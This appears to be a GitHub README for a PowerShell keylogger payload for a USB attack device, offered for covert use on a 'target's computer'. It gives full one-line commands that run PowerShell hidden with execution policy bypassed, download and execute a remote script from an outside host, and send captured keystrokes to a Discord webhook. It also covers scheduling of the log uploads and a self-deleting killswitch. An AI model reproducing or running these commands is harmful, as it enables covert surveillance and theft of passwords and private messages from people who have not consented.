![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Keylogger 

This is a Powershell based keylogger that exfiltrates the logs to discord

## Description

Quickly with just ONE line of code you can deploy a keylogger on your targets computer 

Complete with custom logging times, and self destruct feature

Just move the `keylogger.txt` file over to your flipper and you are good to go

## Getting Started

### Dependencies

* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in your device
* 15 seconds later you have their keystrokes being sent to you

This is the basic command to install the keylogger and provide the webhook for the keystrokes to be sent back to you

* `$dc=''` is the variable where you plug in your discord webhook 

```
powershell -w h -NoP -Ep Bypass $dc='https://link.iamjakoby.com/xxxx';iwr "https://jakoby.lol/m2m" | iex
```
### ADDITIONAL PARAMETERS

The payload is set to send the logs collected every hour on the hour

* You maybe use the `$log` variable to specify a certain time instead (Use this for testing)
* ex: `$log="09:00 pm"`  <-- This will send the log every night at 9pm

You also have the option of setting up a killswitch to have the keylogger self delete at a certain time and date 

`$ks="12/25/2022 10:00:00 PM"`  <-- This will make the keylogger self delete at 10pm on December 25th

Calling the script with both a `log` time and `killswitch` will look something like this: 
 
```
powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='09:00 pm';$ks='12/25/2022 10:00:00 PM';iwr 'https://jakoby.lol/m2m' | iex"
```
### DELETING THE KEYLOGGER

Just hold `Left Control` + `Right Control` for 5 seconds untill the notification box pops up

<img src= https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/keylogger/kkl.png width="400" alt="C#" />



<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
    <td align="center" width="96">
      <a href="https://www.tiktok.com/@i_am_jakoby?lang=en">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>TikTok
    </td>    
  </tr>
</table>
</div>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">back to top</a>)</p>

